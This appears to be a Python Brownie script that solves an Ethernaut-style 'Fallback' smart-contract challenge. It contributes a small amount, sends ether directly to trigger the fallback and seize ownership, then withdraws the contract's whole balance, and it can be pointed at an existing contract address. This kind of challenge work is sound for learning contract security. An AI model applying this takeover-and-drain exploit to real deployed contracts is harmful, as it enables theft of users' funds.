#!/usr/bin/python3
from brownie import Fallback, web3
from scripts.helpful_scripts import get_account
from scripts.deploy import deploy
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


AMOUNT = web3.toWei(0.0002, "ether")


def drain_funds(contract_address=None, attacker=None):
    if not contract_address:
        fallback, owner = deploy()
        contract_address = fallback.address
        #print(contract_address, owner)
        _, attacker = get_account()
    else:
        fallback = Fallback.at(contract_address)

    owner = fallback.owner()
    print(f"{green}Contract Owner: {red}{owner}{reset}")
    print(f"{green}Attacker      : {red}{attacker}{reset}")

    # Contributed
    contrib_tx = fallback.contribute({"from": attacker, "value": AMOUNT})
    contrib_tx.wait(1)
    
    print(f"{green}Contract balance: {red}{web3.fromWei(fallback.balance(), 'ether')} ETH{reset}")
    print(f"{green}Attacker balance: {red}{web3.fromWei(fallback.getContribution({'from': attacker}), 'ether')} ETH{reset}")

    # invoking the fallback function
    print(f"{red}Sending money to contract....{reset}")
    
    tx = attacker.transfer(contract_address, AMOUNT)
    tx.wait(1)
    
    print(f"{green}Attacker balance: {red}{web3.fromWei(fallback.getContribution({'from': attacker}), 'ether')} ETH{reset}")

    print(f"{green}Previous owner: {red}{owner}{reset}")
    print(f"{green}Current owner : {red}{fallback.owner()}{reset}")

    assert attacker == fallback.owner()

    print(f"{red}Draining the funds form the contract....{reset}")
    withdraw_tx = fallback.withdraw({"from": attacker})
    withdraw_tx.wait(1)

    print(f"{green}Contract balance: {red}{web3.fromWei(fallback.balance(), 'ether')} ETH{reset}")
    print(f"{green}Attacker balance: {red}{web3.fromWei(fallback.getContribution({'from': attacker}), 'ether')} ETH{reset}")



def main(contract_address=None):
    if contract_address:
        drain_funds(contract_address, get_account())
    else:
        drain_funds()

if __name__ == '__main__':
    main()